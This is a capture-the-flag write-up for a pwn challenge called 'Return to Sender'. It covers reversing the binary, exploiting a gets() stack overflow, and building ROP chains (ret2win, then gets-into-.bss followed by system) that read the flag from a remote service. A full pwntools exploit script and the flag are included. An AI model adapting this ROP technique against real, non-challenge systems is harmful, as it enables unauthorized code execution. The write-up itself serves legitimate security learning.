# Return to Sender (Pwn) - Writeup

I solved this challenge by reversing the binary first, finding a stack overflow in `gets()`, and then building a reliable ROP chain to execute `cat /app/flag.txt` on the remote service.

## Challenge

- Name: `Return to Sender`
- Description: `Do you ever wonder what happens to your packages? So does your mail carrier.`
- Remote: `nc 143.198.163.4 15858`
- Flag format: `texsaw{...}`

## Initial Setup

I started by checking what files were provided.

```bash
ls -la
file chall
```

The file was a 64-bit ELF, dynamically linked, not stripped.

I then checked protections:

```bash
checksec --file=chall
```

What mattered:

- No PIE (`0x400000` base fixed)
- No canary
- Executable stack / RWX segments
- Partial RELRO

So a classic stack-smash + ret2win/ROP was likely.

## Recon and Reversing

I used these tools to understand the binary:

- `nm -n chall`
- `strings -n 4 chall`
- `objdump -d chall`
- `objdump -s -j .rodata chall`
- `ROPgadget --binary chall`

From symbols/disassembly I found key functions:

- `deliver()` at `0x40126c`
- `drive()` at `0x401211`
- gadget `pop rdi; ret` at `0x4011be`

### Core vulnerability

Inside `deliver()`, there is:

```c
char buf[0x20];
gets(buf);
```

`gets()` allows unbounded input into a 32-byte local stack buffer. Return address overwrite is possible.

### Hidden win logic

`drive()` prints:

`Attempting secret delivery to 3 Dangerous Drive...`

Then checks:

```asm
cmp qword ptr [rbp-0x8], 0x48435344
```

If equal, it prints success and calls `system("/bin/sh")`.

So one obvious chain was:

- overwrite RIP
- `pop rdi; ret`
- `0x48435344`
- `drive()`

## Offset Calculation

`deliver()` allocates `0x20` bytes local buffer.
Saved RBP is 8 bytes above it.
Then saved RIP.

So overwrite offset to RIP is:

- `0x20 + 8 = 40` bytes

I verified this with crash behavior (`A*200` segfaults) and controlled ROP effects.

## Exploit Development Path

### Attempt 1: Direct ret2win shell via `drive()`

Payload:

```python
b'A'*40 + p64(0x4011be) + p64(0x48435344) + p64(0x401211)
```

This reliably reached:

- `Attempting secret delivery...`
- `Success! Secret package delivered.`

So code execution/control flow was confirmed.

But capturing flag output through interactive `/bin/sh` from that path was flaky over the socket timing-wise.

### Attempt 2: Stable command execution with staged ROP

To avoid shell interactivity issues, I switched to a deterministic chain:

1. Call `gets(.bss)` to read my command string
2. Call `system(.bss)` to execute that command directly

Useful addresses:

- `pop rdi; ret` = `0x4011be`
- `gets@plt` = `0x4010c0`
- `system@plt` = `0x4010a0`
- writable `.bss` target = `0x404060`

Final ROP layout:

```python
payload = (
    b'A'*40 +
    p64(0x4011be) + p64(0x404060) + p64(0x4010c0) +
    p64(0x4011be) + p64(0x404060) + p64(0x4010a0)
)
```

Then I sent second-stage input as command text, e.g.:

```bash
cat /app/flag.txt
```

This removed all pseudo-interactive instability and printed command output directly back to socket.

## Final Exploit Script (Used)

```python
from pwn import *

context.log_level = 'error'

HOST, PORT = '143.198.163.4', 15858
POP_RDI = 0x4011be
GETS_PLT = 0x4010c0
SYSTEM_PLT = 0x4010a0
BSS = 0x404060
OFFSET = 40

p = remote(HOST, PORT, timeout=6)
p.recvuntil(b'package?')

payload = b'A' * OFFSET
payload += p64(POP_RDI) + p64(BSS) + p64(GETS_PLT)
payload += p64(POP_RDI) + p64(BSS) + p64(SYSTEM_PLT)

p.sendline(payload)
p.sendline(b'cat /app/flag.txt')

print(p.recvall(timeout=3).decode(errors='ignore'))
```

## Flag

```text
texsaw{sm@sh_st4ck_2_r3turn_to_4nywh3re_y0u_w4nt}
```

## Tools I Used

- `checksec` (binary protections)
- `nm` (function symbols)
- `strings` (quick string intel)
- `objdump` (disassembly and rodata)
- `ROPgadget` (gadget discovery)
- `pwntools` (socket + payload automation)

## Notes / Lessons Learned

- If a ret2win gives a shell but output capture is unstable, staging a command string in memory and calling `system(ptr)` is often cleaner.
- On non-PIE binaries, fixed addresses make first-stage ROP much easier.
- Always confirm packing width (`p64` for amd64); wrong packing can silently break chain reliability.
